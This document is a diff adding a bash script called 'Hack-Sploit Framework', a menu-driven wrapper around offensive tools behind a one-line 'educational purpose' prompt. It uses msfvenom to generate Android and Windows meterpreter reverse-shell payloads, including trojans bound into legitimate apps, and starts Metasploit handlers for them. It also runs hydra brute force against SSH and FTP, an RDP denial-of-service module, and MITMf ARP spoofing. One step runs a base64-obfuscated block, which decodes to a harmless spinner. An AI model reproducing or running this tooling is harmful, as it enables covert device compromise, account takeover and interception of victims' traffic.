@@ -1,0 +1,508 @@
+#!/bin/bash
+cyan="\e[1;36m"
+g="\033[1;32m"
+r="\033[1;31m"
+b="\033[1;34m"
+w="\033[0m"
+red='\e[1;31m'
+yellow='\e[1;33m'
+orange='\e[38;5;166m'
+green='\e[1;32m'
+
+
+if [[ $(/usr/bin/id -u) -ne 0 ]];
+then
+echo -e "$b __________________________"
+echo -e "$red ROOT REQUIRED or TRYING SUDO .."
+echo -e "$b __________________________"
+exit
+
+else
+echo -e "$b __________________________"
+echo -e "$green ROOT ACCESS CONFIRM .."
+echo -e "$b __________________________"
+sleep 1
+fi
+
+echo -e "$green
+A White Hat hacker tests systems and networks by trying to break into them. They are hackers, but their talents are being used to improve Cyber Security. Being hackers, they are familiar with the tactics that malicious hackers use to compromise systems; White Hat hackers try to find the vulnerabilities before the bad guys do.
+The most significant difference between Black Hat and White Hat hackers is that the latter is permitted by companies to try and break into their Cyber Security systems.
+White Hat hackers are also called “Ethical Hackers” or “Certified Ethical Hackers.” In some instances, White Hat hackers assume other Cyber Security titles within an organization.
+"
+sleep 1.5
+echo -e "
+$yellow
+Black hat hackers are malicious hackers, sometimes called crackers. Black hats lack ethics, sometimes violate laws, and break into computer systems with malicious intent, and they may violate the confidentiality, integrity, or availability of an organization's systems and data.
+White hat hackers are the good guys, who include professional penetration testers who break into systems with permission, malware researchers who study malicious code to provide better understanding and to disclose vulnerabilities to vendors, etc. White hat hackers are also known as ethical hackers; they follow a code of ethics and obey laws.
+
+"
+echo -n -e "$yellow PLEASE USE FOR EDUCATIONAL PURPOSE ( y / n ) : "
+read document
+if [[ $document == y ]];
+then
+echo -e "$b __________________________"
+echo -e "$green STARTING HACKSPLOIT"
+echo -e "$b __________________________"
+sleep 1.2
+else
+echo -e "$b __________________________"
+echo -e "$green STOPPING TOOL "
+echo -e "$b __________________________"
+sleep 1.2
+exit
+
+fi
+
+clear
+
+echo -e " $red
+                            _______________________________________________________________
+     _ΠΠΠΠ_                |                                                              |
+      () ()                |               Hack-Sploit  Framework                         |
+       ---                 |                    By Mr Unknown                             |
+    ^__ΠΠΠΠ__^             |             INSTAGRAM = @cyber_tech_world                    |
+       | |                 |______________________________________________________________|
+       | |                                                                  $green | v 1.0 |
+$red       | |                                                                    $green ------
+$red  ________________
+ &&&&&&&&&&&&&&&&&
+ -----------------
+
+"
+echo -e "$green ________________________"
+echo -e "$yellow SELECT YOUR OPTION :- "
+echo -e "$green ________________________"
+echo -e " $green
+          1. NORMAL MALWARE                          7. DOS ATTACK ( BLUE SCREEN OF DEATH )
+          2. BIND MALWARE                            8. MAN IN THE MIDDLE ATTACK ( MITM )
+          3. NETWORK SCANNING                        99 EXIT
+          4. SSH LOGIN
+          5. FTP LOGIN
+          6. COMPUTER / SYSTEM HACKING
+"
+echo -n -e " $b ──($red hack-sploit $b)$b────$b[$green~$b]──[$orange menu$b ]:
+"
+echo -e -n $b " └─$red # "
+read choose
+
+
+# NORMAL MALWARE SCRIPT FIRST CODE
+##################################
+
+
+
+if [[ $choose == 1 ]];
+then
+echo -n -e "$cyan Enter your LOCALHOST ( LHOST ) : "
+read host
+echo -n -e "$cyan Enter your LOCALPORT ( LPORT ) : "
+read port
+echo -n -e "$cyan Enter your APK NAME ( ex = test.apk ) : "
+read apkname
+echo -e "$yellow ___________________________________________"   
+echo -e "$yellow [ + ] GENERATING PAYLOAD ......"
+echo " ___________________________________________"
+msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port -o $apkname
+echo "___________________________________________"
+echo -e "$yellow [ + ] PAYLOAD GENRATED ....."
+echo "___________________________________________"
+echo ""
+echo -e "
+$b ________________________________________________________
+$green        C   O    P   Y     C  O  M  M  A  N  D  S
+$b ________________________________________________________   
+$green                 I  F      P  R  E  S  E  N  T  msf >
+$b ________________________________________________________
+
+
+$green
+        ________________________________________________________
+       |                                                        |
+       |   use exploit/multi/handler                            |
+       |   set PAYLOAD android/meterpreter/reverse_tcp          |
+       |   set LHOST < your host >                              |
+       |   set LPORT < your port >                              |
+       |   exploit                                              |
+       |________________________________________________________|
+"
+
+echo -e "$yellow ___________________________________________"
+echo -e "[ + ] Prepare Phone Hacking Process...... "
+echo -e "___________________________________________"
+msfconsole -q
+
+
+
+# BIND MALWARE SECOND CODE
+##################################
+
+
+
+elif [[ $choose == 2 ]];
+then
+echo -e "$yellow ________________________________________________"
+echo -e "$green INSTALL THE ORIGNAL APK LIKE ( LUDO ) IN UNDER 2 TO 6 MB "
+echo -e "$yellow ________________________________________________"
+echo ""
+echo -n -e "$cyan Type Your Orignal Apk name : "
+                   
+read orignalapk
+echo -n -e "$cyan Type Your Orignal Apk Location : "
+read location      
+echo -e -n "$cyan Type Your Localhost ( LHOST ) : "
+read localhost     
+echo -n -e "$cyan Type Your localport ( LPORT ) : "
+read localport     
+echo -n -e "$cyan Type Your Apk name ( ex = test.apk ) : "
+read yourapk       
+echo -e "$yellow ___________________________________________"
+echo -e "[ + ] GENERATING BIND MALWARE ....."
+echo "___________________________________________"
+msfvenom -x $location$orignalapk -p android/meterpreter/reverse_tcp LHOST=$localhost LPORT=$localport -o $location$yourapk
+echo -e "$yellow ___________________________________________"
+echo "[ * ] GENERATED SUCCESSFULL ...."
+echo "___________________________________________"
+echo ""
+echo -e "$yellow ___________________________________________"
+echo "CHECK YOUR ORIGNAL APK LOCATION "
+echo "___________________________________________"
+sleep 2.9
+echo -e "
+$b ________________________________________________________
+$green        C   O    P   Y     C  O  M  M  A  N  D  S
+$b ________________________________________________________
+$green                 I  F      P  R  E  S  E  N  T  msf >
+$b ________________________________________________________
+
+
+$green
+        ________________________________________________________
+       |                                                        |
+       |   use exploit/multi/handler                            |
+       |   set PAYLOAD android/meterpreter/reverse_tcp          |
+       |   set LHOST < your host >                              |
+       |   set LPORT < your port >                              |
+       |   exploit                                              |
+       |________________________________________________________|
+"
+
+echo -e "$yellow ___________________________________________"
+echo -e "[ + ] Prepare Phone Hacking Process...... "
+echo -e "___________________________________________"
+msfconsole -q
+
+elif [[ $choose == 3 ]];
+then
+echo -e "$yellow"
+echo -n -e "$cyan Enter Your IP LIKE ( 192.168.0.1 ) : "
+read network
+echo -e "$green ________________________"
+echo -e "$yellow SELECT YOUR OPTION :- "
+echo -e "$green ________________________"
+echo -e "
+                1. NORMAL SCANNING
+                2. PORT SCANNING YOUR CHOICE
+                3. VERSION SCANNING
+                4. ADVANCED SCANNING
+"
+echo -n -e " $b ──($red hack-sploit Network Scanning $b)$b────$b[$green~$b]──[$orange menu$b ]:
+"                                  
+echo -e -n $b " └─$red # "
+read scanning
+if [[ $scanning == 1 ]];
+then
+echo -e "$b ___________________________________"
+echo -e "$green SCANNING STARTED PLEASE WAIT.."
+echo -e "$b ___________________________________"
+echo -e "$green"
+sudo nmap $network
+
+elif [[ $scanning == 2 ]];
+then
+echo -n -e "$cyan Enter Your Port : "
+read port
+echo -e "$b ___________________________________"
+echo -e "$green SCANNING STARTED PLEASE WAIT.."
+echo -e "$b ___________________________________"
+echo -e "$green"
+sudo nmap -p $port $network 
+
+elif [[ $scanning == 3 ]];
+then
+echo -e "$b ___________________________________"
+echo -e "$green SCANNING STARTED PLEASE WAIT.."
+echo -e "$b ___________________________________"
+echo -e "$green"
+sudo nmap $network -sV
+
+elif [[ $scanning == 4 ]];
+then
+echo -e "$b ___________________________________"
+echo -e "$green SCANNING STARTED PLEASE WAIT.."
+echo -e "$b ___________________________________"
+echo -e "$green"
+sudo nmap $network -sV -sC -sT -sU -oO
+
+elif [[ $scanning == "" ]];
+then
+echo -e "$b ___________________________________"
+echo -e "$green YOUR OPTION IS BLANK AND INVALID "
+echo -e "$b ___________________________________"
+fi
+
+elif [[ $choose == 4 ]];
+then
+echo -n -e "$cyan TARGET INTERNET PROTOCOL ( IP ) : "
+read sshtarget
+echo -e "$b ___________________________________"
+echo -e "$green 22 PORT SET COMPLEATE "
+echo -e "$b ___________________________________"
+echo ""
+echo -n -e "$cyan SET YOUR USERNAME WORDLIST ( ex = username.txt ) IF YOU KNOW USERNAME THEN ENTER : "
+read know
+echo -n -e "$cyan SET YOUR TARGET USERNAME IF YOU SET USERNAME WORDLIST THEN ENTER :  "
+read username
+echo -n -e "$cyan SET YOUR PASS WORDLIST ( ex = wordlist.txt ) : "
+read wordlist
+if [[ $know == "" ]];
+then
+echo -e "$b ___________________________________"
+echo -e "$green [ + ] ATTACKING STARTED PLEASE WAIT .."
+echo -e "$b ___________________________________"
+echo ""
+sudo hydra ssh://$sshtarget -l $username -P $wordlist -t 2 -V
+else
+echo -e "$b ___________________________________"
+echo -e "$green [ + ] ATTACKING STARTED PLEASE WAIT .."
+echo -e "$b ___________________________________"
+echo ""
+sudo hydra ssh://$sshtarget -L $know -P $wordlist -t 2 -V
+fi
+
+elif [[ $choose == 5 ]];
+then
+echo -n -e "$cyan TARGET INTERNET PROTOCOL ( IP ) : "
+read ftptarget
+echo -e "$b ___________________________________"
+echo -e "$green 21 PORT SET COMPLEATE "
+echo -e "$b ___________________________________"
+echo ""
+echo -n -e "$cyan SET YOUR USERNAME WORDLIST ( ex = username.txt ) IF YOU KNOW USERNAME THEN ENTER : "
+read ftpknow
+echo -n -e "$cyan SET YOUR TARGET USERNAME IF YOU SET USERNAME WORDLIST THEN ENTER : "
+read ftpusername
+echo -n -e "$cyan SET YOUR PASS WORDLIST ( ex = wordlist.txt ) : "
+read ftpwordlist
+if [[ $ftpknow = "" ]];
+                    
+then
+echo -e "$b ___________________________________"
+echo -e "$green [ + ] ATTACKING STARTED PLEASE WAIT .."
+echo -e "$b ___________________________________"
+echo ""
+sudo hydra ftp://$ftptarget -l $ftpusername -P $ftpwordlist -t 2 -V
+
+else
+echo -e "$b ___________________________________"
+echo -e "$green [ + ] ATTACKING STARTED PLEASE WAIT .."
+echo -e "$b ___________________________________"
+echo ""
+sudo hydra ftp://$ftptarget -L $ftpknow -P $ftpwordlist -t 2 -V
+
+fi
+
+elif [[ $choose == 6 ]];
+then
+echo -e "$yellow ________________________________________________"
+echo -e "$green COMPUTER / SYSTEM HACKING WITH .exe FILE"
+echo -e "$yellow ________________________________________________"
+echo ""
+echo -e "$green ________________________"
+echo -e "$yellow SELECT YOUR OPTION :- "
+echo -e "$green ________________________"
+echo -e "
+             1. NORMAL TROJAN
+             2. BIND TROJAN
+"
+echo -n -e " $b ──($red hack-sploit COMPUTER / SYSTEM HACKING $b)$b────$b[$green~$b]──[$orange menu$b ]:
+"
+echo -e -n $b " └─$red # "
+read trojan
+if [[ $trojan == 1 ]];
+then
+echo -e -n "$cyan SET YOUR LHOST LIKE ( 192.168.X.X ) : "
+read lhostexe
+echo -e -n "$cyan SET YOUR LPORT ( DEFAULT : 4444 ) : "
+read portexe
+echo -e -n "$cyan SET YOUR EXE NAME LIKE ( test.exe ) : "
+read wow
+echo -e "$yellow ___________________________________________"
+echo -e "$yellow [ + ] GENERATING TROJAN ......"
+echo " ___________________________________________"
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhostexe LPORT=$portexe -f exe -o $wow
+echo -e "$yellow ___________________________________________"
+echo -e "$yellow [ + ] TROJAN GENERATED SUCCESSFULLY..."
+echo " ___________________________________________"
+echo -e "
+$b ________________________________________________________
+$green        C   O    P   Y     C  O  M  M  A  N  D  S
+$b ________________________________________________________
+$green                 I  F      P  R  E  S  E  N  T  msf >
+$b ________________________________________________________
+
+
+$green
+        ________________________________________________________
+       |                                                        |
+       |   use exploit/multi/handler                            |
+       |   set PAYLOAD windows/meterpreter/reverse_tcp          |
+       |   set LHOST < your host >                              |
+       |   set LPORT < your port >                              |
+       |   exploit                                              |
+       |________________________________________________________|
+"
+echo -e "$yellow ___________________________________________"
+echo -e "[ + ] Prepare Computer / System Hacking Process...... "
+echo -e "___________________________________________"
+msfconsole -q
+
+elif [[ $trojan == 2 ]];
+
+then
+echo -e "$yellow ________________________________________________"
+echo -e "$green INSTALL THE ORIGNAL EXE LIKE ( LUDO ) IN UNDER 2 TO 6 MB "
+echo -e "$yellow ________________________________________________"
+echo ""
+echo -e -n "$cyan SET YOUR ORIGNAL EXE NAME : "
+read orignalexe
+echo -e -n "$cyan SET YOUR ORIGNAL EXE LOCATION : "
+read orignallocation
+echo -e -n "$cyan SET YOUR LHOST : "
+read orignalhost
+echo -e -n "$cyan SET YOUR LPORT : "
+read orignalport
+echo -e -n "$cyan SET YOUR EXE NAME ( ex = test.exe ) : "
+read orignaltest
+echo -e "$yellow ___________________________________________"
+echo -e "[ + ] GENERATING BIND TROJAN ......"
+echo "___________________________________________"
+msfvenom -x $orignallocation$orignalexe -p windows/meterpreter/reverse_tcp LHOST=$orignalhost LPORT=$orignalport -o $orignallocation$orignaltest
+echo -e "$yellow ___________________________________________"
+echo "[ * ] GENERATED SUCCESSFULL ...."
+echo "___________________________________________"
+echo ""
+echo -e "$yellow ___________________________________________"
+echo "[ * ] CHECK YOUR ORIGNAL EXE LOCATION ...."
+echo "___________________________________________"
+echo ""
+sleep 2
+echo -e "
+$b ________________________________________________________
+$green        C   O    P   Y     C  O  M  M  A  N  D  S
+$b ________________________________________________________
+$green                 I  F      P  R  E  S  E  N  T  msf >
+$b ________________________________________________________
+
+
+$green
+        ________________________________________________________
+       |                                                        |
+       |   use exploit/multi/handler                            |
+       |   set PAYLOAD windows/meterpreter/reverse_tcp          |
+       |   set LHOST < your host >                              |
+       |   set LPORT < your port >                              |
+       |   exploit                                              |
+       |________________________________________________________|
+"
+echo -e "$yellow ___________________________________________"
+echo -e "[ + ] Prepare Computer / System Hacking Process...... "
+echo -e "___________________________________________"
+msfconsole -q
+
+else
+echo -e "$b ___________________________________"
+echo -e "$green YOUR OPTION IS BLANK AND INVALID "
+echo -e "$b ___________________________________"
+
+
+fi
+
+elif [[ $choose == 7 ]];
+then
+echo -e "
+$b __________________________________________________________
+$green      W  I  N  D  O  W  S    D  O  S  A  T  T  A  C  K
+$b __________________________________________________________
+$green          F O L L O W        I N S T R U C T I O N
+$b __________________________________________________________
+
+$green
+         ________________________________________________________
+        |                                                        |
+        |      THIS IS WORK ONLY THIS WINDOWS                    |
+        |                                                        |
+        | _______________________________________________________|
+        |                                                        |
+        |    1. ONLY WINDOWS 7                                   |
+        |    2. 32 BIT                                           |
+        |    3. PROCESSOR = INTEL(R) CELERON(R) 1019Y @ 1.00 GHz |
+        |________________________________________________________|
+
+"
+echo -e "$b __________________________________________"
+echo -e "$green PREPARING DOS ATTACK IN WINDOWS 7 "
+echo -e "$b __________________________________________"
+echo ""
+source <(echo "c3Bpbm5lcj0oICd8JyAnLycgJy0nICdcJyApOwoKY291bnQoKXsKICBzcGluICYKICBwaWQ9JCEKICBmb3IgaSBpbiBgc2VxIDEgMTBgCiAgZG8KICAgIHNsZWVwIDE7CiAgZG9uZQoKICBraWxsICRwaWQgIAp9CgpzcGluKCl7CiAgd2hpbGUgWyAxIF0KICBkbyAKICAgIGZvciBpIGluICR7c3Bpbm5lcltAXX07IAogICAgZG8gCiAgICAgIGVjaG8gLW5lICJcciRpIjsKICAgICAgc2xlZXAgMC4yOwogICAgZG9uZTsKICBkb25lCn0KCmNvdW50" | base64 -d)
+echo -e "
+$b ________________________________________________________
+$green        C   O    P   Y     C  O  M  M  A  N  D  S
+$b ________________________________________________________
+$green                 I  F      P  R  E  S  E  N  T  msf >
+$b ________________________________________________________
+
+
+$green
+
+        ________________________________________________________             
+       |                                                        |
+       |   use auxiliary/dos/windows/rdp/ms12_020_maxchannelids |                         
+       |   set RHOST < TARGET HOST >                            |
+       |   set RPORT 3389                                       |                            
+       |   exploit                                              |
+       |________________________________________________________|
+"
+msfconsole -q
+
+elif [[ $choose == 8 ]];
+then
+echo -e "$b ________________________________________________________"
+echo -e "$green  M A N   I N    T H E   M I D D L E    A T T A C K "
+echo -e "$b ________________________________________________________"
+echo ""
+echo -e -n "$cyan ENTER YOUR WIFI IP ADDRESS LIKE ( 192.168.X.X ) : "
+read wifiip
+echo -e -n "$cyan ENTER YOUR TARGET IP ADDRESS LIKE ( 192.168.X.X ) : "
+read targetwifi
+echo -e -n "$cyan ENTER YOUR TARGET WIFI INTERFACE : "
+read interface
+echo ""
+echo -e "$yellow _________________________________"
+echo -e "$greeN [ + ] STARTING ATTACK ......"
+echo -e "$yellow _________________________________"
+sleep 1.5
+mitmf --arp --spoof --gateway $wifiip --target $targetwifi -i $interface
+
+elif [[ $choose == 99 ]];
+then
+exit
+
+else
+
+echo -e "$b ___________________________________"
+echo -e "$red [ - ] INVALID OPTION "
+echo -e "$b ___________________________________"
+echo ""
+sleep 1
+bash HackSploit
+fi
